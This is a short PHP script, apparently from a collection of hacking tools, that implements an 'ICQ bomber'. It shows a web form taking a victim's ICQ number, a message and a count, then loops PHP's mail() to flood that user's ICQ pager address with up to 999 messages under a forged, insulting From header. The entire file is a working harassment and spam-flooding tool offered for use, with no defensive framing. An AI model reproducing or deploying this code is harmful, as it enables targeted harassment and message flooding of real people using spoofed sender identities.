<?php
include('toolheader.php');

if(!$mode) {
$mode = "form";
}

if($mode == "form") {
?>
	<form action="<?php echo $SCRIPT_NAME ?>" method="POST">
	<table border=0>
	<tr>
	<td>
	uin:<input type="text" name="uin" size="10"><br>
	</td></tr>
	<tr><td>
	message:<br>
	<textarea name="msg"></textarea></td></tr>
	<tr><td>
	Number of Msgs:<input type=text name=num size=3 maxlength=3>
	</td></tr></table>
	<input type=hidden name=mode value=send>
	<input type=submit></form>
	
<?
}

else if($mode == "send") {

function icqbomb($uin, $msg, $num) {

	$subject = "msg from above";
	$headers = "From: your-mother@suckers.com";
	$uin .= "@pager.icq.com";
	for($i=0; $i<$num; $i++) {
		
		mail($uin,$subject,$msg,$headers);
		
	}
echo "You just sent, $num msgs to $uin . Such a nice guy.";
}

icqbomb($uin, $msg, $num);

}

include('toolfooter.php');

?>
